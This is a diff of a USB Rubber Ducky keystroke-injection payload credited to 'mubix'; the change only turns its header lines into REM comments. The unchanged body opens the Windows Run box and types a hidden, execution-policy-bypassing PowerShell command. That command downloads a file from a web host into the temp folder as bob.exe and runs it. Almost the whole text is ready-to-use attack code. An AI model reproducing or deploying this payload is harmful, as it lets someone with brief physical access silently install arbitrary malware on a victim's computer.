@@ -1,9 +1,9 @@
-Powershell Wget + Execute
-
-Author: mubix
-Duckencoder: 1.3
-Target: Windows 7
-Description: Opens “RUN” box, throws power shell string, enter. Supports HTTP/S, and proxies.
+REM Powershell Wget + Execute
+REM 
+REM Author: mubix
+REM Duckencoder: 1.3
+REM Target: Windows 7
+REM Description: Opens “RUN” box, throws power shell string, enter. Supports HTTP/S, and proxies.
  GUI r
  DELAY 100
  STRING powershell -NoP -NonI -W Hidden -Exec Bypass "IEX (New-Object System.Net.WebClient).DownloadFile('http://example.com/bob.txt',\"$env:temp\bob.exe\"); Start-Process \"$env:temp\bob.exe\""
